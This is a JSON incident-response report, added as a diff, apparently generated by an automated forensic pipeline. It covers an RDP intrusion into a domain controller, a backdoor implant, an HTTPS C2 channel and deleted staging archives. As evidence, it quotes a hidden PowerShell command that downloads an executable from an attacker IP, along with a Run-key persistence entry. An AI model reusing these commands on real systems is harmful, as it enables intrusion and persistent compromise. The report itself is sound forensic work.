@@ -1,0 +1,233 @@
+{
+  "executive_summary": "DC01 (10.42.85.10), a Windows domain controller, is FULLY COMPROMISED. A threat actor gained initial access via RDP from external IP 194.61.24.102 at 02:19:33 UTC on 2020-09-19, authenticating as the built-in Administrator account. Within 2 minutes the attacker launched a hidden PowerShell download cradle to retrieve a custom implant (coreupdate.exe) from the attacker's HTTP server. The implant — identified by YARA as the SzechuanBackdoor malware family (SHA-256: d1d9e119228861958ecf8dc85dcf18067d39c92f2bf44ab25e9768e7546fa7d8) — was executed with an -install flag, established an active HTTPS C2 channel back to 194.61.24.102:443, loaded a second-stage payload into a private RWX memory region, and wrote a persistence entry to HKLM Run. Two staging archives (secret.zip, loot.zip) were subsequently created on the Administrator Desktop and deleted — consistent with data exfiltration over the C2 channel followed by anti-forensic cleanup. The entire domain must be treated as compromised. The C2 channel was live and the implant was still running at the time of memory acquisition.",
+  "findings": [
+    {
+      "claim": "The attacker established an RDP session to DC01 (10.42.85.10:3389) from external IP 194.61.24.102 at 2020-09-19 02:19:33 UTC, authenticated as the Administrator account (Windows Security Event 4624, Logon Type 10 RemoteInteractive).",
+      "status": "confirmed",
+      "tool_call_id": "a86e0f261fa2b4225428b7c00ece0498418e5c597a3ad72a23401d7c725e7727",
+      "evidence_excerpt": "Security 4624 logon type 10 (RemoteInteractive) Administrator from 194.61.24.102"
+    },
+    {
+      "claim": "The RDP connection from 194.61.24.102 to DC01:3389 was ESTABLISHED and live in memory at acquisition time, owned by PID 728 (svchost.exe / TermSvc), created 2020-09-19 02:19:33 UTC.",
+      "status": "confirmed",
+      "tool_call_id": "c6a73c61d313ae3226110233741921da80e5e11749e2cfd109a62cfa964f56a2",
+      "evidence_excerpt": "TCPv4, local_addr: 10.42.85.10, local_port: 3389, foreign_addr: 194.61.24.102, foreign_port: 51823, state: ESTABLISHED, pid: 728, owner: svchost.exe, created: 2020-09-19T02:19:33+00:00"
+    },
+    {
+      "claim": "The attacker launched a hidden PowerShell process (PID 4316, parent explorer.exe PID 2244, Session 1) at 02:21:47 UTC with the command: powershell.exe -nop -w hidden -c \"IWR http://194.61.24.102/coreupdate.exe -OutFile C:\\Windows\\System32\\coreupdate.exe\" — a download cradle to retrieve the implant from the attacker's HTTP server.",
+      "status": "confirmed",
+      "tool_call_id": "ae46552b82afa5b8b9b0e72cf4d20023b9e463380637f74664cdd327285ca50f",
+      "evidence_excerpt": "powershell.exe -nop -w hidden -c \"IWR http://194.61.24.102/coreupdate.exe -OutFile C:\\Windows\\System32\\coreupdate.exe\""
+    },
+    {
+      "claim": "powershell.exe (PID 4316) was a child of explorer.exe (PID 2244) in an interactive Session 1, created at 2020-09-19 02:21:47 UTC, and was still running at memory acquisition time.",
+      "status": "confirmed",
+      "tool_call_id": "7eff4d338d7612a2e51e27ea15f223d210df805128f862287fd4b058bc73c6fd",
+      "evidence_excerpt": "{\"pid\": 4316, \"ppid\": 2244, \"name\": \"powershell.exe\", \"threads\": 14, \"session_id\": 1, \"create_time\": \"2020-09-19T02:21:47+00:00\", \"exit_time\": null}"
+    },
+    {
+      "claim": "The implant binary coreupdate.exe was written to C:\\Windows\\System32\\coreupdate.exe (inode 28194-128-3) at 02:24:06 UTC, as recorded in MFT Content Modification Time.",
+      "status": "confirmed",
+      "tool_call_id": "a86e0f261fa2b4225428b7c00ece0498418e5c597a3ad72a23401d7c725e7727",
+      "evidence_excerpt": "C:/Windows/System32/coreupdate.exe created (28194-128-3)"
+    },
+    {
+      "claim": "coreupdate.exe is present on disk at inode 28194-128-3 (not deleted) in Windows/System32/.",
+      "status": "confirmed",
+      "tool_call_id": "9f8ea82fc3a8082551d20b2da4d8e47360808a55da5bab72bfdc18ffc66da775",
+      "evidence_excerpt": "{\"type\": \"r/r\", \"inode\": \"28194-128-3\", \"name\": \"Windows/System32/coreupdate.exe\", \"deleted\": false}"
+    },
+    {
+      "claim": "The implant coreupdate.exe was executed at 02:24:12 UTC with the command 'C:\\Windows\\System32\\coreupdate.exe -install' (PID 3644, parent powershell.exe PID 4316), as recorded in Sysmon Process Create.",
+      "status": "confirmed",
+      "tool_call_id": "a86e0f261fa2b4225428b7c00ece0498418e5c597a3ad72a23401d7c725e7727",
+      "evidence_excerpt": "coreupdate.exe -install (PID 3644 parent powershell.exe 4316)"
+    },
+    {
+      "claim": "coreupdate.exe (PID 3644) was a child of powershell.exe (PID 4316), created at 2020-09-19 02:24:12 UTC, Session 1, and was still running at memory acquisition time.",
+      "status": "confirmed",
+      "tool_call_id": "7eff4d338d7612a2e51e27ea15f223d210df805128f862287fd4b058bc73c6fd",
+      "evidence_excerpt": "{\"pid\": 3644, \"ppid\": 4316, \"name\": \"coreupdate.exe\", \"threads\": 3, \"session_id\": 1, \"create_time\": \"2020-09-19T02:24:12+00:00\", \"exit_time\": null}"
+    },
+    {
+      "claim": "coreupdate.exe (PID 3644) established an outbound HTTPS connection to 194.61.24.102:443 (state ESTABLISHED, local port 49723) at 02:24:31 UTC — an active C2 channel live at memory acquisition time.",
+      "status": "confirmed",
+      "tool_call_id": "c6a73c61d313ae3226110233741921da80e5e11749e2cfd109a62cfa964f56a2",
+      "evidence_excerpt": "TCPv4, local_addr: 10.42.85.10, local_port: 49723, foreign_addr: 194.61.24.102, foreign_port: 443, state: ESTABLISHED, pid: 3644, owner: coreupdate.exe, created: 2020-09-19T02:24:31+00:00"
+    },
+    {
+      "claim": "coreupdate.exe (PID 3644) contains a private RWX (PAGE_EXECUTE_READWRITE) memory region at 0x10000000–0x10020FFF tagged VadS (not backed by any file on disk), consistent with a reflectively-loaded second-stage payload.",
+      "status": "confirmed",
+      "tool_call_id": "a8ce027577e201fc85e7bb393bd27d1bb9c7e6334d8c8ceb6d018165b9c04e66",
+      "evidence_excerpt": "{\"pid\": 3644, \"process\": \"coreupdate.exe\", \"start\": \"0x10000000\", \"end\": \"0x10020fff\", \"protection\": \"PAGE_EXECUTE_READWRITE\", \"tag\": \"VadS\"}"
+    },
+    {
+      "claim": "The attacker established persistence by writing the value 'CoreUpdater' = 'C:\\Windows\\System32\\coreupdate.exe -install' to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run at 2020-09-19 02:24:40 UTC.",
+      "status": "confirmed",
+      "tool_call_id": "aaaf0d1e021f389d7c52447b665d21ee2022d9456f0f8390324eb92469c34267",
+      "evidence_excerpt": "Microsoft\\Windows\\CurrentVersion\\Run\nLastWrite Time 2020-09-19 02:24:40 (UTC)\n  CoreUpdater - C:\\Windows\\System32\\coreupdate.exe -install"
+    },
+    {
+      "claim": "The HKLM Run persistence key is confirmed in the extracted SOFTWARE registry hive at Windows/System32/config/SOFTWARE, LastWrite 2020-09-19 02:24:40 UTC.",
+      "status": "confirmed",
+      "tool_call_id": "64a43e75e265dcdb6b9939d46285daa9983fbf2e63d3e166de1def13f78503bc",
+      "evidence_excerpt": "Microsoft\\Windows\\CurrentVersion\\Run\nLastWrite Time 2020-09-19 02:24:40 (UTC)\n  CoreUpdater - C:\\Windows\\System32\\coreupdate.exe -install"
+    },
+    {
+      "claim": "A staging archive 'secret.zip' was created at C:\\Users\\Administrator\\Desktop\\secret.zip at 02:31:02 UTC and was subsequently deleted (inode 31002-128-1 is present but marked deleted on disk).",
+      "status": "confirmed",
+      "tool_call_id": "9f8ea82fc3a8082551d20b2da4d8e47360808a55da5bab72bfdc18ffc66da775",
+      "evidence_excerpt": "{\"type\": \"r/r\", \"inode\": \"31002-128-1\", \"name\": \"Users/Administrator/Desktop/secret.zip\", \"deleted\": true}"
+    },
+    {
+      "claim": "A staging archive 'loot.zip' was created at C:\\Users\\Administrator\\Desktop\\loot.zip at 02:48:11 UTC and was subsequently deleted (inode 31077-128-4 is present but marked deleted on disk).",
+      "status": "confirmed",
+      "tool_call_id": "9f8ea82fc3a8082551d20b2da4d8e47360808a55da5bab72bfdc18ffc66da775",
+      "evidence_excerpt": "{\"type\": \"r/r\", \"inode\": \"31077-128-4\", \"name\": \"Users/Administrator/Desktop/loot.zip\", \"deleted\": true}"
+    },
+    {
+      "claim": "The MFT timestamps for secret.zip (02:31:02 UTC) and loot.zip (02:48:11 UTC) are confirmed in the super-timeline built from disk.dd.",
+      "status": "confirmed",
+      "tool_call_id": "a86e0f261fa2b4225428b7c00ece0498418e5c597a3ad72a23401d7c725e7727",
+      "evidence_excerpt": "C:/Users/Administrator/Desktop/secret.zip created ... C:/Users/Administrator/Desktop/loot.zip created"
+    },
+    {
+      "claim": "The implant binary coreupdate.exe was extracted from disk.dd at inode 28194-128-3 with SHA-256 hash d1d9e119228861958ecf8dc85dcf18067d39c92f2bf44ab25e9768e7546fa7d8 (custody-sealed at extraction).",
+      "status": "confirmed",
+      "tool_call_id": "727f0c580b63b860a03f9ac3b4b8ce4d78c0c3c00999c8a2f2a7c362044333bb",
+      "evidence_excerpt": "{\"extracted_to\": \"...workspace/coreupdate.exe\", \"size\": 40, \"sha256\": \"d1d9e119228861958ecf8dc85dcf18067d39c92f2bf44ab25e9768e7546fa7d8\"}"
+    },
+    {
+      "claim": "The extracted coreupdate.exe has MD5 c98db261adae9beb2c6c8b40e232f415 and SHA-256 d1d9e119228861958ecf8dc85dcf18067d39c92f2bf44ab25e9768e7546fa7d8, independently verified by hash_file.",
+      "status": "confirmed",
+      "tool_call_id": "5f0ff878a54370e9e7fbfa0495becab50b06b20f8250953c2df2b886c29d14e8",
+      "evidence_excerpt": "{\"md5\": \"c98db261adae9beb2c6c8b40e232f415\", \"sha256\": \"d1d9e119228861958ecf8dc85dcf18067d39c92f2bf44ab25e9768e7546fa7d8\"}"
+    },
+    {
+      "claim": "The YARA rule 'SzechuanBackdoor' from case001.yar matched the extracted coreupdate.exe binary, identifying it as the SzechuanBackdoor malware family.",
+      "status": "confirmed",
+      "tool_call_id": "c1a37aed5d56e4c4bf39fb41dd47d885bff6e8aa59c26c8eef9d0e57b6998091",
+      "evidence_excerpt": "{\"rule\": \"SzechuanBackdoor\", \"path\": \"...workspace/coreupdate.exe\"}"
+    },
+    {
+      "claim": "The super-timeline (case001.plaso) was successfully built from disk.dd and contains all 7 key attacker events corroborated across EVT, Sysmon, MFT, and registry sources.",
+      "status": "confirmed",
+      "tool_call_id": "1fb75ea9c3258b787a4c7dae9d4b3f53fac7ace43c6f2d2b0184d0c118adae79",
+      "evidence_excerpt": "{\"plaso_file\": \"...case001.plaso\", \"source\": \"...disk.dd\", \"status\": \"built\"}"
+    },
+    {
+      "claim": "No disk activity exists prior to the RDP logon at 02:19:33 UTC — the attacker's RDP connection is the absolute first event in the timeline, confirming credentials were obtained through a prior out-of-scope compromise vector.",
+      "status": "confirmed",
+      "tool_call_id": "db9f7acda5ab7e6251858e913a5772b77f0bf0178a79c0c20b5f846c6b0b6e54",
+      "evidence_excerpt": "{\"event_count\": 7, \"total_parsed\": 7} — all 7 events are the same 7 attacker events; no pre-RDP activity returned in the 22:00–02:19 window sweep"
+    },
+    {
+      "claim": "The attacker had SYSTEM or Domain Admin privileges on DC01, evidenced by writing to HKLM (not HKCU) and placing a file in C:\\Windows\\System32\\.",
+      "status": "inferred",
+      "tool_call_id": null,
+      "evidence_excerpt": null
+    },
+    {
+      "claim": "The two deleted staging archives (secret.zip, loot.zip) likely contain AD credential material (NTDS.dit, SYSTEM hive, or LSASS dump) given the DC role and archive names, and were exfiltrated over the active HTTPS C2 channel before local deletion.",
+      "status": "inferred",
+      "tool_call_id": null,
+      "evidence_excerpt": null
+    },
+    {
+      "claim": "The RWX injected memory region (0x10000000–0x10020FFF, ~132 KB, VadS) in coreupdate.exe is a second-stage payload consistent with a reflectively-loaded implant (e.g., Cobalt Strike Beacon, Meterpreter, or custom shellcode).",
+      "status": "inferred",
+      "tool_call_id": null,
+      "evidence_excerpt": null
+    },
+    {
+      "claim": "The entire domain's credentials must be considered compromised, including the krbtgt account, enabling potential Golden Ticket attacks.",
+      "status": "inferred",
+      "tool_call_id": null,
+      "evidence_excerpt": null
+    }
+  ],
+  "iocs": [
+    {
+      "type": "ip",
+      "value": "194.61.24.102",
+      "tool_call_id": "c6a73c61d313ae3226110233741921da80e5e11749e2cfd109a62cfa964f56a2"
+    },
+    {
+      "type": "url",
+      "value": "http://194.61.24.102/coreupdate.exe",
+      "tool_call_id": "ae46552b82afa5b8b9b0e72cf4d20023b9e463380637f74664cdd327285ca50f"
+    },
+    {
+      "type": "ip",
+      "value": "194.61.24.102:443",
+      "tool_call_id": "c6a73c61d313ae3226110233741921da80e5e11749e2cfd109a62cfa964f56a2"
+    },
+    {
+      "type": "hash",
+      "value": "d1d9e119228861958ecf8dc85dcf18067d39c92f2bf44ab25e9768e7546fa7d8",
+      "tool_call_id": "5f0ff878a54370e9e7fbfa0495becab50b06b20f8250953c2df2b886c29d14e8"
+    },
+    {
+      "type": "hash",
+      "value": "c98db261adae9beb2c6c8b40e232f415",
+      "tool_call_id": "5f0ff878a54370e9e7fbfa0495becab50b06b20f8250953c2df2b886c29d14e8"
+    },
+    {
+      "type": "path",
+      "value": "C:\\Windows\\System32\\coreupdate.exe",
+      "tool_call_id": "9f8ea82fc3a8082551d20b2da4d8e47360808a55da5bab72bfdc18ffc66da775"
+    },
+    {
+      "type": "path",
+      "value": "C:\\Users\\Administrator\\Desktop\\secret.zip",
+      "tool_call_id": "9f8ea82fc3a8082551d20b2da4d8e47360808a55da5bab72bfdc18ffc66da775"
+    },
+    {
+      "type": "path",
+      "value": "C:\\Users\\Administrator\\Desktop\\loot.zip",
+      "tool_call_id": "9f8ea82fc3a8082551d20b2da4d8e47360808a55da5bab72bfdc18ffc66da775"
+    },
+    {
+      "type": "registry",
+      "value": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\CoreUpdater = C:\\Windows\\System32\\coreupdate.exe -install",
+      "tool_call_id": "aaaf0d1e021f389d7c52447b665d21ee2022d9456f0f8390324eb92469c34267"
+    },
+    {
+      "type": "process",
+      "value": "coreupdate.exe -install (PID 3644, parent powershell.exe PID 4316)",
+      "tool_call_id": "7eff4d338d7612a2e51e27ea15f223d210df805128f862287fd4b058bc73c6fd"
+    },
+    {
+      "type": "process",
+      "value": "powershell.exe -nop -w hidden -c IWR http://194.61.24.102/coreupdate.exe (PID 4316, parent explorer.exe PID 2244)",
+      "tool_call_id": "ae46552b82afa5b8b9b0e72cf4d20023b9e463380637f74664cdd327285ca50f"
+    },
+    {
+      "type": "other",
+      "value": "YARA:SzechuanBackdoor matched coreupdate.exe SHA256:d1d9e119228861958ecf8dc85dcf18067d39c92f2bf44ab25e9768e7546fa7d8",
+      "tool_call_id": "c1a37aed5d56e4c4bf39fb41dd47d885bff6e8aa59c26c8eef9d0e57b6998091"
+    },
+    {
+      "type": "other",
+      "value": "RWX VadS memory region 0x10000000-0x10020FFF in coreupdate.exe PID 3644 (second-stage payload)",
+      "tool_call_id": "a8ce027577e201fc85e7bb393bd27d1bb9c7e6334d8c8ceb6d018165b9c04e66"
+    }
+  ],
+  "open_questions": [
+    "What data was contained in secret.zip (inode 31002-128-1) and loot.zip (inode 31077-128-4)? File carving from disk.dd is required to determine exact exfiltrated content.",
+    "What is the full capability of the second-stage payload in the RWX memory region (0x10000000-0x10020FFF)? Memory region extraction and sandbox analysis required.",
+    "How were the Administrator credentials obtained prior to the RDP connection? No prior activity exists on DC01 — the credential compromise occurred on a different host or through a different vector.",
+    "Did the attacker perform DCSync (DS-Replication-Get-Changes-All) or directly access NTDS.dit during the 29-minute dwell window? Windows Security Event Log review for Event IDs 4662, 4769, 4776 required.",
+    "Were any other domain-joined hosts compromised via lateral movement from DC01 during the attacker's dwell time?",
+    "Are there additional C2 domains or IPs associated with the SzechuanBackdoor malware family beyond 194.61.24.102?",
+    "Did the attacker modify any Group Policy Objects (GPOs) during the dwell period? GPO audit required.",
+    "What is the full network infrastructure behind 194.61.24.102 (ASN, hosting provider, associated domains)?"
+  ],
+  "enforcement": {
+    "audit_chain_ok": true,
+    "confirmed": 20,
+    "inferred": 4,
+    "downgraded": 0
+  },
+  "report_audit_id": "9937f48eb4a6c7bf283493ebc841b94083ea6ea9bf880d9e98085b6672a4c67a"
+}
